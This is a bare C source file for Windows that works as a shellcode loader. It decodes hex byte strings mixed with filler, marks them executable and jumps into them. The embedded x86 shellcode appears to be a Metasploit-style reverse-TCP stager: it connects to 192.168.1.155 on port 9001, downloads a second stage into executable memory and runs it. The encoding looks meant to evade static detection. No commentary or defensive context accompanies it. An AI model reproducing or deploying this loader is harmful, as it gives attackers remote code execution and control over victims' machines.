#include <Windows.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdio.h>

int main(int argc, char *argv[])
{
	static char scstr[999][3] = 
	{
		"fc", "\xcc", "e8", "\xcc", "82", "\xcc", "00", "\xcc", "00", "\xcc", "00", "\xcc", "60", "\xcc", "89", "\xcc", "e5", "\xcc", "31", "\xcc", "c0", "\xcc", "64", "\xcc", "8b", "\xcc", "50", "\xcc", "30", "\xcc", "8b", "\xcc", "52", "\xcc", "0c", "\xcc", "8b", "\xcc", "52", "\xcc", "14", "\xcc", "8b", "\xcc", "72", "\xcc", "28", "\xcc", "0f", "\xcc", "b7", "\xcc", "4a", "\xcc", "26", "\xcc", "31", "\xcc", "ff", "\xcc", "ac", "\xcc", "3c", "\xcc", "61", "\xcc", "7c", "\xcc", "02", "\xcc", "2c", "\xcc", "20", "\xcc", "c1", "\xcc", "cf", "\xcc", "0d", "\xcc", "01", "\xcc", "c7", "\xcc", "e2", "\xcc", "f2", "\xcc", "52", "\xcc", "57", "\xcc", "8b", "\xcc", "52", "\xcc", "10", "\xcc", "8b", "\xcc", "4a", "\xcc", "3c", "\xcc", "8b", "\xcc", "4c", "\xcc", "11", "\xcc", "78", "\xcc", "e3", "\xcc", "48", "\xcc", "01", "\xcc", "d1", "\xcc", "51", "\xcc", "8b", "\xcc", "59", "\xcc", "20", "\xcc", "01", "\xcc", "d3", "\xcc", "8b", "\xcc", "49", "\xcc", "18", "\xcc", "e3", "\xcc", "3a", "\xcc", "49", "\xcc", "8b", "\xcc", "34", "\xcc", "8b", "\xcc", "01", "\xcc", "d6", "\xcc", "31", "\xcc", "ff", "\xcc", "ac", "\xcc", "c1", "\xcc", "cf", "\xcc", "0d", "\xcc", "01", "\xcc", "c7", "\xcc", "38", "\xcc", "e0", "\xcc", "75", "\xcc", "f6", "\xcc", "03", "\xcc", "7d", "\xcc", "f8", "\xcc", "3b", "\xcc", "7d", "\xcc", "24", "\xcc", "75", "\xcc", "e4", "\xcc", "58", "\xcc", "8b", "\xcc", "58", "\xcc", "24", "\xcc", "01", "\xcc", "d3", "\xcc", "66", "\xcc", "8b", "\xcc", "0c", "\xcc", "4b", "\xcc", "8b", "\xcc", "58", "\xcc", "1c", "\xcc", "01", "\xcc", "d3", "\xcc", "8b", "\xcc", "04", "\xcc", "8b", "\xcc", "01", "\xcc", "d0", "\xcc", "89", "\xcc", "44", "\xcc", "24", "\xcc", "24", "\xcc", "5b", "\xcc", "5b", "\xcc", "61", "\xcc", "59", "\xcc", "5a", "\xcc", "51", "\xcc", "ff", "\xcc", "e0", "\xcc", "5f", "\xcc", "5f", "\xcc", "5a", "\xcc", "8b", "\xcc", "12", "\xcc", "eb", "\xcc", "8d", "\xcc", "5d", "\xcc", "68", "\xcc", "33", "\xcc", "32", "\xcc", "00", "\xcc", "00", "\xcc", "68", "\xcc", "77", "\xcc", "73", "\xcc", "32", "\xcc", "5f", "\xcc", "54", "\xcc", "68", "\xcc", "4c", "\xcc", "77", "\xcc", "26", "\xcc", "07", "\xcc", "ff", "\xcc", "d5", "\xcc", "b8", "\xcc", "90", "\xcc", "01", "\xcc", "00", "\xcc", "00", "\xcc", "29", "\xcc", "c4", "\xcc", "54", "\xcc", "50", "\xcc", "68", "\xcc", "29", "\xcc", "80", "\xcc", "6b", "\xcc", "00", "\xcc", "ff", "\xcc", "d5", "\xcc", "6a", "\xcc", "05", "\xcc", "68", "\xcc", "c0", "\xcc", "a8", "\xcc", "01", "\xcc", "9b", "\xcc", "68", "\xcc", "02", "\xcc", "00", "\xcc", "23", "\xcc", "29", "\xcc", "89", "\xcc", "e6", "\xcc", "50", "\xcc", "50", "\xcc", "50", "\xcc", "50", "\xcc", "40", "\xcc", "50", "\xcc", "40", "\xcc", "50", "\xcc", "68", "\xcc", "ea", "\xcc", "0f", "\xcc", "df", "\xcc", "e0", "\xcc", "ff", "\xcc", "d5", "\xcc", "97", "\xcc", "6a", "\xcc", "10", "\xcc", "56", "\xcc", "57", "\xcc", "68", "\xcc", "99", "\xcc", "a5", "\xcc", "74", "\xcc", "61", "\xcc", "ff", "\xcc", "d5", "\xcc", "85", "\xcc", "c0", "\xcc", "74", "\xcc", "0a", "\xcc", "ff", "\xcc", "4e", "\xcc", "08", "\xcc", "75", "\xcc", "ec", "\xcc", "e8", "\xcc", "61", "\xcc", "00", "\xcc", "00", "\xcc", "00", "\xcc", "6a", "\xcc", "00", "\xcc", "6a", "\xcc", "04", "\xcc", "56", "\xcc", "57", "\xcc", "68", "\xcc", "02", "\xcc", "d9", "\xcc", "c8", "\xcc", "5f", "\xcc", "ff", "\xcc", "d5", "\xcc", "83", "\xcc", "f8", "\xcc", "00", "\xcc", "7e", "\xcc", "36", "\xcc", "8b", "\xcc", "36", "\xcc", "6a", "\xcc", "40", "\xcc", "68", "\xcc", "00", "\xcc", "10", "\xcc", "00", "\xcc", "00", "\xcc", "56", "\xcc", "6a", "\xcc", "00", "\xcc", "68", "\xcc", "58", "\xcc", "a4", "\xcc", "53", "\xcc", "e5", "\xcc", "ff", "\xcc", "d5", "\xcc", "93", "\xcc", "53", "\xcc", "6a", "\xcc", "00", "\xcc", "56", "\xcc", "53", "\xcc", "57", "\xcc", "68", "\xcc", "02", "\xcc", "d9", "\xcc", "c8", "\xcc", "5f", "\xcc", "ff", "\xcc", "d5", "\xcc", "83", "\xcc", "f8", "\xcc", "00", "\xcc", "7d", "\xcc", "22", "\xcc", "58", "\xcc", "68", "\xcc", "00", "\xcc", "40", "\xcc", "00", "\xcc", "00", "\xcc", "6a", "\xcc", "00", "\xcc", "50", "\xcc", "68", "\xcc", "0b", "\xcc", "2f", "\xcc", "0f", "\xcc", "30", "\xcc", "ff", "\xcc", "d5", "\xcc", "57", "\xcc", "68", "\xcc", "75", "\xcc", "6e", "\xcc", "4d", "\xcc", "61", "\xcc", "ff", "\xcc", "d5", "\xcc", "5e", "\xcc", "5e", "\xcc", "ff", "\xcc", "0c", "\xcc", "24", "\xcc", "e9", "\xcc", "71", "\xcc", "ff", "\xcc", "ff", "\xcc", "ff", "\xcc", "01", "\xcc", "c3", "\xcc", "29", "\xcc", "c6", "\xcc", "75", "\xcc", "c7", "\xcc", "c3", "\xcc", "bb", "\xcc", "f0", "\xcc", "b5", "\xcc", "a2", "\xcc", "56", "\xcc", "6a", "\xcc", "00", "\xcc", "53", "\xcc", "ff", "\xcc", "d5", "\xcc" 
	};

	size_t inlen = 666;
	size_t sclen = inlen / 2;

	uint8_t *shellcode = (uint8_t*)&scstr[0][0];

	for (size_t i = 0; i < inlen; i += 2) 
	{
		char h[3] = { 0 };
		h[0] = scstr[i][0];
		h[1] = scstr[i][1];

		uint8_t byte = (uint8_t)strtol(h, NULL, 16);
		shellcode[i / 2] = byte;
	}

	DWORD dwOld;
	if (!VirtualProtect(shellcode, sclen, PAGE_EXECUTE_READ, &dwOld))
		return -1;

	(*(void(*)(void))shellcode)();

	//if (!VirtualProtect(shellcode, sclen, dwOld, &dwOld))
		//return -1;

	return 0;
}
